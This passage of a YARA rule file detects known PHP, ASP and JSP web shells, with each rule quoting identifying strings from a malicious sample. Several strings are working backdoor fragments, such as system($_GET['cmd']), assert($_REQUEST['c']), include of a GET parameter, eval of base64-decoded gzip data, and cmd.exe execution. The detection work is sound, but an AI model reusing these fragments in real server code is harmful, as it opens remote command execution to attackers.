		description = "Web Shell - file Worse Linux Shell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		old_rule_name = "webshell_Worse_Linux_Shell"
		score = 70
		hash = "8338c8d9eab10bd38a7116eb534b5fa2"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "system(\"mv \".$_FILES['_upl']['tmp_name'].\" \".$currentWD"
	condition:
		all of them
}
rule webshell_zacosmall {
	meta:
		description = "Web Shell - file zacosmall.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "5295ee8dc2f5fd416be442548d68f7a6"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "if($cmd!==''){ echo('<strong>'.htmlspecialchars($cmd).\"</strong><hr>"
	condition:
		all of them
}
rule webshell_Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit {
	meta:
		description = "Web Shell - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "c6eeacbe779518ea78b8f7ed5f63fc11"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "<option value=\"cat /etc/passwd\">/etc/passwd</option>" fullword
	condition:
		all of them
}
rule webshell_redirect {
	meta:
		description = "Web Shell - file redirect.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "97da83c6e3efbba98df270cc70beb8f8"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s7 = "var flag = \"?txt=\" + (document.getElementById(\"dl\").checked ? \"2\":\"1\" "
	condition:
		all of them
}
rule webshell_jsp_cmdjsp {
	meta:
		description = "Web Shell - file cmdjsp.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "b815611cc39f17f05a73444d699341d4"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s5 = "<FORM METHOD=GET ACTION='cmdjsp.jsp'>" fullword
	condition:
		all of them
}
rule webshell_Java_Shell {
	meta:
		description = "Web Shell - file Java Shell.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "36403bc776eb12e8b7cc0eb47c8aac83"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s4 = "public JythonShell(int columns, int rows, int scrollback) {" fullword
		$s9 = "this(null, Py.getSystemState(), columns, rows, scrollback);" fullword
	condition:
		1 of them
}
rule webshell_asp_1d {
	meta:
		description = "Web Shell - file 1d.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "fad7504ca8a55d4453e552621f81563c"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "+9JkskOfKhUxZJPL~\\(mD^W~[,{@#@&EO"
	condition:
		all of them
}
rule webshell_jsp_IXRbE {
	meta:
		description = "Web Shell - file IXRbE.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "e26e7e0ebc6e7662e1123452a939e2cd"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "<%if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application"
	condition:
		all of them
}
rule webshell_PHP_G5 {
	meta:
		description = "Web Shell - file G5.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "95b4a56140a650c74ed2ec36f08d757f"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s3 = "echo \"Hacking Mode?<br><select name='htype'><option >--------SELECT--------</op"
	condition:
		all of them
}
rule webshell_PHP_r57142 {
	meta:
		description = "Web Shell - file r57142.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "0911b6e6b8f4bcb05599b2885a7fe8a8"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');" fullword
	condition:
		all of them
}
rule webshell_jsp_tree {
	meta:
		description = "Web Shell - file tree.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "bcdf7bbf7bbfa1ffa4f9a21957dbcdfa"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s5 = "$('#tt2').tree('options').url = \"selectChild.action?checki"
		$s6 = "String basePath = request.getScheme()+\"://\"+request.getServerName()+\":\"+requ"
	condition:
		all of them
}
rule webshell_C99madShell_v_3_0_smowu {
	meta:
		description = "Web Shell - file smowu.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "74e1e7c7a6798f1663efb42882b85bee"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s2 = "<tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Enter ::</b><for"
		$s8 = "<p><font color=red>Wordpress Not Found! <input type=text id=\"wp_pat\"><input ty"
	condition:
		1 of them
}
rule webshell_simple_backdoor {
	meta:
		description = "Web Shell - file simple-backdoor.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "f091d1b9274c881f8e41b2f96e6b9936"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "$cmd = ($_REQUEST['cmd']);" fullword
		$s1 = "if(isset($_REQUEST['cmd'])){" fullword
		$s4 = "system($cmd);" fullword
	condition:
		2 of them
}
rule webshell_PHP_404 {
	meta:
		description = "Web Shell - file 404.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "078c55ac475ab9e028f94f879f548bca"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s4 = "<span>Posix_getpwuid (\"Read\" /etc/passwd)"
	condition:
		all of them
}
rule webshell_Macker_s_Private_PHPShell {
	meta:
		description = "Web Shell - file Macker's Private PHPShell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "e24cbf0e294da9ac2117dc660d890bb9"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s3 = "echo \"<tr><td class=\\\"silver border\\\">&nbsp;<strong>Server's PHP Version:&n"
		$s4 = "&nbsp;&nbsp;<?php echo buildUrl(\"<font color=\\\"navy\\\">["
		$s7 = "echo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type="
	condition:
		all of them
}
rule webshell_Antichat_Shell_v1_3_2 {
	meta:
		description = "Web Shell - file Antichat Shell v1.3.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "40d0abceba125868be7f3f990f031521"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s3 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - Antichat Shell</title><m"
	condition:
		all of them
}
rule webshell_Safe_mode_breaker {
	meta:
		description = "Web Shell - file Safe mode breaker.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "5bd07ccb1111950a5b47327946bfa194"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s5 = "preg_match(\"/SAFE\\ MODE\\ Restriction\\ in\\ effect\\..*whose\\ uid\\ is("
		$s6 = "$path =\"{$root}\".((substr($root,-1)!=\"/\") ? \"/\" : NULL)."
	condition:
		1 of them
}
rule webshell_Sst_Sheller {
	meta:
		description = "Web Shell - file Sst-Sheller.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "d93c62a0a042252f7531d8632511ca56"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s2 = "echo \"<a href='?page=filemanager&id=fm&fchmod=$dir$file'>"
		$s3 = "<? unlink($filename); unlink($filename1); unlink($filename2); unlink($filename3)"
	condition:
		all of them
}
rule webshell_jsp_list {
	meta:
		description = "Web Shell - file list.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "1ea290ff4259dcaeb680cec992738eda"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "<FORM METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">" fullword
		$s2 = "out.print(\") <A Style='Color: \" + fcolor.toString() + \";' HRef='?file=\" + fn"
		$s7 = "if(flist[i].canRead() == true) out.print(\"r\" ); else out.print(\"-\");" fullword
	condition:
		all of them
}
rule webshell_PHPJackal_v1_5 {
	meta:
		description = "Web Shell - file PHPJackal v1.5.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "d76dc20a4017191216a0315b7286056f"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s7 = "echo \"<center>${t}MySQL cilent:</td><td bgcolor=\\\"#333333\\\"></td></tr><form"
		$s8 = "echo \"<center>${t}Wordlist generator:</td><td bgcolor=\\\"#333333\\\"></td></tr"
	condition:
		all of them
}
rule webshell_customize {
	meta:
		description = "Web Shell - file customize.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "d55578eccad090f30f5d735b8ec530b1"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s4 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z"
	condition:
		all of them
}
rule webshell_s72_Shell_v1_1_Coding {
	meta:
		description = "Web Shell - file s72 Shell v1.1 Coding.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "c2e8346a5515c81797af36e7e4a3828e"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s5 = "<font face=\"Verdana\" style=\"font-size: 8pt\" color=\"#800080\">Buradan Dosya "
	condition:
		all of them
}
rule webshell_jsp_sys3 {
	meta:
		description = "Web Shell - file sys3.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "b3028a854d07674f4d8a9cf2fb6137ec"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">" fullword
		$s4 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\""
		$s9 = "<%@page contentType=\"text/html;charset=gb2312\"%>" fullword
	condition:
		all of them
}
rule webshell_jsp_guige02 {
	meta:
		description = "Web Shell - file guige02.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "a3b8b2280c56eaab777d633535baf21d"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "????????????????%><html><head><title>hahahaha</title></head><body bgcolor=\"#fff"
		$s1 = "<%@page contentType=\"text/html; charset=GBK\" import=\"java.io.*;\"%><%!private"
	condition:
		all of them
}
rule webshell_php_ghost {
	meta:
		description = "Web Shell - file ghost.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "38dc8383da0859dca82cf0c943dbf16d"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "<?php $OOO000000=urldecode('%61%68%36%73%62%65%68%71%6c%61%34%63%6f%5f%73%61%64'"
		$s6 = "//<img width=1 height=1 src=\"http://websafe.facaiok.com/just7z/sx.asp?u=***.***"
		$s7 = "preg_replace('\\'a\\'eis','e'.'v'.'a'.'l'.'(KmU(\"" fullword
	condition:
		all of them
}
rule webshell_WinX_Shell {
	meta:
		description = "Web Shell - file WinX Shell.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "17ab5086aef89d4951fe9b7c7a561dda"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s5 = "print \"<font face=\\\"Verdana\\\" size=\\\"1\\\" color=\\\"#990000\\\">Filenam"
		$s8 = "print \"<font face=\\\"Verdana\\\" size=\\\"1\\\" color=\\\"#990000\\\">File: </"
	condition:
		all of them
}
rule webshell_Crystal_Crystal {
	meta:
		description = "Web Shell - file Crystal.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "fdbf54d5bf3264eb1c4bff1fac548879"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "show opened ports</option></select><input type=\"hidden\" name=\"cmd_txt\" value"
		$s6 = "\" href=\"?act=tools\"><font color=#CC0000 size=\"3\">Tools</font></a></span></f"
	condition:
		all of them
}
rule webshell_r57_1_4_0 {
	meta:
		description = "Web Shell - file r57.1.4.0.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "574f3303e131242568b0caf3de42f325"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s4 = "@ini_set('error_log',NULL);" fullword
		$s6 = "$pass='abcdef1234567890abcdef1234567890';" fullword
		$s7 = "@ini_restore(\"disable_functions\");" fullword
		$s9 = "@ini_restore(\"safe_mode_exec_dir\");" fullword
	condition:
		all of them
}

rule webshell_asp_ajn {
	meta:
		description = "Web Shell - file ajn.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "aaafafc5d286f0bff827a931f6378d04"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "seal.write \"Set WshShell = CreateObject(\"\"WScript.Shell\"\")\" & vbcrlf" fullword
		$s6 = "seal.write \"BinaryStream.SaveToFile \"\"c:\\downloaded.zip\"\", adSaveCreateOve"
	condition:
		all of them
}
rule webshell_php_cmd {
	meta:
		description = "Web Shell - file cmd.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "c38ae5ba61fd84f6bbbab98d89d8a346"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "if($_GET['cmd']) {" fullword
		$s1 = "// cmd.php = Command Execution" fullword
		$s7 = "  system($_GET['cmd']);" fullword
	condition:
		all of them
}
rule webshell_asp_list {
	meta:
		description = "Web Shell - file list.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "1cfa493a165eb4b43e6d4cc0f2eab575"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "<INPUT TYPE=\"hidden\" NAME=\"type\" value=\"<%=tipo%>\">" fullword
		$s4 = "Response.Write(\"<h3>FILE: \" & file & \"</h3>\")" fullword
	condition:
		all of them
}
rule webshell_PHP_co {
	meta:
		description = "Web Shell - file co.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "62199f5ac721a0cb9b28f465a513874c"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "cGX6R9q733WvRRjISKHOp9neT7wa6ZAD8uthmVJV" fullword
		$s11 = "6Mk36lz/HOkFfoXX87MpPhZzBQH6OaYukNg1OE1j" fullword
	condition:
		all of them
}
rule webshell_PHP_150 {
	meta:
		description = "Web Shell - file 150.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "400c4b0bed5c90f048398e1d268ce4dc"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "HJ3HjqxclkZfp"
		$s1 = "<? eval(gzinflate(base64_decode('" fullword
	condition:
		all of them
}
rule webshell_jsp_cmdjsp_2 {
	meta:
		description = "Web Shell - file cmdjsp.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "1b5ae3649f03784e2a5073fa4d160c8b"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd);" fullword
		$s4 = "<FORM METHOD=GET ACTION='cmdjsp.jsp'>" fullword
	condition:
		all of them
}
rule webshell_PHP_c37 {
	meta:
		description = "Web Shell - file c37.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "d01144c04e7a46870a8dd823eb2fe5c8"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s3 = "array('cpp','cxx','hxx','hpp','cc','jxx','c++','vcproj'),"
		$s9 = "++$F; $File = urlencode($dir[$dirFILE]); $eXT = '.:'; if (strpos($dir[$dirFILE],"
	condition:
		all of them
}
rule webshell_PHP_b37 {
	meta:
		description = "Web Shell - file b37.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "0421445303cfd0ec6bc20b3846e30ff0"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "xmg2/G4MZ7KpNveRaLgOJvBcqa2A8/sKWp9W93NLXpTTUgRc"
	condition:
		all of them
}
rule webshell_php_backdoor {
	meta:
		description = "Web Shell - file php-backdoor.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "2b5cb105c4ea9b5ebc64705b4bd86bf7"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fname))" fullword
		$s2 = "<pre><form action=\"<? echo $PHP_SELF; ?>\" METHOD=GET >execute command: <input "
	condition:
		all of them
}
rule webshell_asp_dabao {
	meta:
		description = "Web Shell - file dabao.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "3919b959e3fa7e86d52c2b0a91588d5d"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s2 = " Echo \"<input type=button name=Submit onclick=\"\"document.location =&#039;\" &"
		$s8 = " Echo \"document.Frm_Pack.FileName.value=\"\"\"\"+year+\"\"-\"\"+(month+1)+\"\"-"
	condition:
		all of them
}
rule webshell_php_2 {
	meta:
		description = "Web Shell - file 2.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "267c37c3a285a84f541066fc5b3c1747"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "<?php assert($_REQUEST[\"c\"]);?> " fullword
	condition:
		all of them
}
rule webshell_asp_cmdasp {
	meta:
		description = "Web Shell - file cmdasp.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "57b51418a799d2d016be546f399c2e9b"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
		$s7 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword
	condition:
		all of them
}
rule webshell_spjspshell {
	meta:
		description = "Web Shell - file spjspshell.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "d39d51154aaad4ba89947c459a729971"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s7 = "Unix:/bin/sh -c tar vxf xxx.tar Windows:c:\\winnt\\system32\\cmd.exe /c type c:"
	condition:
		all of them
}
rule webshell_jsp_action {
	meta:
		description = "Web Shell - file action.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "5a7d931094f5570aaf5b7b3b06c3d8c0"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "String url=\"jdbc:oracle:thin:@localhost:1521:orcl\";" fullword
		$s6 = "<%@ page contentType=\"text/html;charset=gb2312\"%>" fullword
	condition:
		all of them
}
rule webshell_Inderxer {
	meta:
		description = "Web Shell - file Inderxer.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "9ea82afb8c7070817d4cdf686abe0300"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s4 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input typ"
	condition:
		all of them
}
rule webshell_asp_Rader {
	meta:
		description = "Web Shell - file Rader.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "ad1a362e0a24c4475335e3e891a01731"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s1 = "FONT-WEIGHT: bold; FONT-SIZE: 10px; BACKGROUND: none transparent scroll repeat 0"
		$s3 = "m\" target=inf onClick=\"window.open('?action=help','inf','width=450,height=400 "
	condition:
		all of them
}
rule webshell_c99_madnet_smowu {
	meta:
		description = "Web Shell - file smowu.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "3aaa8cad47055ba53190020311b0fb83"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "//Authentication" fullword
		$s1 = "$login = \"" fullword
		$s2 = "eval(gzinflate(base64_decode('"
		$s4 = "//Pass"
		$s5 = "$md5_pass = \""
		$s6 = "//If no pass then hash"
	condition:
		all of them
}
rule webshell_php_moon {
	meta:
		description = "Web Shell - file moon.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "2a2b1b783d3a2fa9a50b1496afa6e356"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s2 = "echo '<option value=\"create function backshell returns string soname"
		$s3 = "echo      \"<input name='p' type='text' size='27' value='\".dirname(_FILE_).\""
		$s8 = "echo '<option value=\"select cmdshell(\\'net user "
	condition:
		2 of them
}

rule webshell_minupload {
	meta:
		description = "Web Shell - file minupload.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "ec905a1395d176c27f388d202375bdf9"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">   " fullword
		$s9 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859"
	condition:
		all of them
}
rule webshell_ELMALISEKER_Backd00r {
	meta:
		description = "Web Shell - file ELMALISEKER Backd00r.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "3aa403e0a42badb2c23d4a54ef43e2f4"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "response.write(\"<tr><td bgcolor=#F8F8FF><input type=submit name=cmdtxtFileOptio"
		$s2 = "if FP = \"RefreshFolder\" or request.form(\"cmdOption\")=\"DeleteFolder\" or req"
	condition:
		all of them
}
rule webshell_PHP_bug_1_ {
	meta:
		description = "Web Shell - file bug (1).php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "91c5fae02ab16d51fc5af9354ac2f015"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "@include($_GET['bug']);" fullword
	condition:
		all of them
}
rule webshell_caidao_shell_hkmjj {
	meta:
		description = "Web Shell - file hkmjj.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "e7b994fe9f878154ca18b7cde91ad2d0"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s6 = "codeds=\"Li#uhtxhvw+%{{%,#@%{%#wkhq#hydo#uhtxhvw+%knpmm%,#hqg#li\"  " fullword
	condition:
		all of them
}
rule webshell_jsp_asd {
	meta:
		description = "Web Shell - file asd.jsp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "a042c2ca64176410236fcc97484ec599"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s3 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%>" fullword
		$s6 = "<input size=\"100\" value=\"<%=application.getRealPath(\"/\") %>\" name=\"url"
	condition:
		all of them
}

rule webshell_metaslsoft {
	meta:
		description = "Web Shell - file metaslsoft.php"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "aa328ed1476f4a10c0bcc2dde4461789"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s7 = "$buff .= \"<tr><td><a href=\\\"?d=\".$pwd.\"\\\">[ $folder ]</a></td><td>LINK</t"
	condition:
		all of them
}
rule webshell_asp_Ajan {
	meta:
		description = "Web Shell - file Ajan.asp"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		date = "2014/01/28"
		score = 70
		hash = "b6f468252407efc2318639da22b08af0"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
